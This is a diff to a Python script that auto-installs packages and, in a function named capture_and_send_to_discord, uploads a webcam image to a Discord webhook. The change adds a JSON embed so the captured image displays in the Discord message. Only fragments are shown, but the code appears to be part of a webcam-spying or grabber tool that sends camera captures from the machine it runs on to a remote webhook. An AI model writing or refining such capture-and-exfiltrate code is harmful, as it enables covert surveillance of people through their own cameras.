@@ -1,5 +1,6 @@
 import subprocess
 import sys
+import json
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 try:
@@ -37,8 +38,18 @@ def capture_and_send_to_discord(webhook_url):
         files = {
             'file': ('webcam.png', img_byte_arr, 'image/png')
         }
+        payload = {
+            "embeds": [
+                {
+                    "color": 0x8B0000,
+                    "image": {
+                        "url": "attachment://webcam.png"
+                    }
+                }
+            ]
+        }
         try:
-            response = requests.post(webhook_url, files=files)
+            response = requests.post(webhook_url, files=files, data={"payload_json": json.dumps(payload)})
             if response.status_code == 200:
                 print("Image successfully sent to Discord")
             else:
